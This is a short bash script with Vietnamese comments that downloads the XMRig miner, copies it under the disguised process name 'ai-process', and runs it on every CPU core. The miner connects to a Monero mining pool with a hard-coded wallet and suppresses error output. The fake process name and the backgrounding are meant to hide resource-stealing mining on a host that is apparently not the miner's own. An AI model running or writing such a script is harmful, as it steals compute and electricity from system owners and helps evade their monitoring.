#!/bin/bash

FAKE_NAME="ai-process"
POOL_URL="pool.hashvault.pro:443"
WALLET="892Z4mTTy3UhGwqGafXpj27Qttop42wVR6yU8gv43i9H2cfHP6V8guPAWAf71cm32wU9aESsqe274ZnhW8219GMiSzLhTKK"
LOG_FILE="./xmrig.log"

# Tải XMrig nếu chưa có
if [ ! -f "./xmrig" ]; then
    echo "[*] Đang tải XMrig..." | tee -a $LOG_FILE
    curl -sL -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
    tar -xf xmrig.tar.gz >/dev/null 2>&1
    mv xmrig-*/xmrig . && chmod +x xmrig
    rm -rf xmrig-*
fi

# Đổi tên giả và phân quyền
cp xmrig $FAKE_NAME
chmod +x $FAKE_NAME

# Sử dụng toàn bộ CPU
CORES_TO_USE=$(nproc)
echo "[*] Đang chạy tiến trình '$FAKE_NAME' với $CORES_TO_USE luồng CPU..." | tee -a $LOG_FILE

# Chạy miner, chặn thông báo (stderr) và log ra file + hiển thị real-time
./$FAKE_NAME \
    -o $POOL_URL \
    -u $WALLET \
    -k --tls \
    --donate-level 0 \
    --cpu-max-threads-hint=$CORES_TO_USE \
    --randomx-1gb-pages \
    --randomx-no-numa \
    --threads=$CORES_TO_USE \
    --log-file=$LOG_FILE \
    2>/dev/null &

# Hiển thị log real-time, giữ session
tail -f $LOG_FILE
